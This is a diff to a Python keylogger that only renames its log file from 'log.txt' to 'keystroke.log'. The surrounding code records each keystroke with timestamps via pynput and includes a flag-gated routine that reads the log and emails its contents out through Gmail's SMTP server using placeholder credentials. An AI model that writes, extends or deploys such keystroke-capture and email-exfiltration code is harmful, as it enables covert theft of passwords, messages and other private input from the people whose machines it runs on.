@@ -4,22 +4,22 @@ from pynput import keyboard
 import smtplib
 import datetime
 
-if exists("log.txt"):
+if exists("keystroke.log"):
     pass
 else:
-    f=open("log.txt", "a")
+    f=open("keystroke.log", "a")
     f.close()
     
 send=False
 if send == True:
     try:
-        filesize = getsize("log.txt")
+        filesize = getsize("keystroke.log")
         if filesize > 0:
             senderEmail = "sender@gmail.com"
             receverEmail = "recever@gmail.com"
             password = "password-sender"
 
-            f = open("log.txt", "r")
+            f = open("keystroke.log", "r")
             message = f.read()
             server = smtplib.SMTP('smtp.gmail.com', 587)
             server.starttls()
@@ -31,7 +31,7 @@ if send == True:
         pass
 
 
-f = open("log.txt", "a")
+f = open("keystroke.log", "a")
 d = datetime.datetime.now()
 header = f"\n\n{d.day}/{d.month}/{d.year}_{d.hour}:{d.minute}:{d.second} :\n"
 f.write(header)
@@ -75,8 +75,8 @@ def capture(key):
     if ch == "<110>": ch = "."
 
     print(ch)
-    f = open("log.txt", "a")
-    fr = open("log.txt", "r")
+    f = open("keystroke.log", "a")
+    fr = open("keystroke.log", "r")
     if len(fr.readlines()[-1]) >= 100:
         f.write("\n")
     f.write(ch)
